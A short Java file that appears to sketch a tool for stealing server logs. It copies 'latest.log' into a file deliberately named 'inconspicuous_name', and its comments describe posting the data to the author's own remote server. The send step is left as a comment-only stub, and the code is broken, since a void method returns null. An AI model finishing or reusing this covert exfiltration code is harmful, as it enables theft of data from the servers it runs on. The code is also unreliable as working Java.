import java.io.*;

class main {
    public static void main(String[] args) throws IOException {
        // all you really have to do is copy the server logs
        // then send those to a remote server

        // initalize input and output
        FileInputStream in = null;
        FileOutputStream out = null;

        // this is the copy part
        try {

        in=new FileInputStream("../../../src/logs/latest.log");
        out=new FileOutputStream("inconspicuous_name");
        int c;
        while((c=in.read())!=-1) {out.write(c);}

        } finally {
            if (in != null) {
                in.close();
            }
            if (out != null) {
                out.close();
            }
        }


    }

    public static void sendToRemote() {
       /*

       yeah so I'm not going to write this right now
       but you essentially send a post request to your
       server containing the data that is being logged
       you can use regexp and stuff to filter out things
       that you want or don't want

        */
       return null;
    }
}
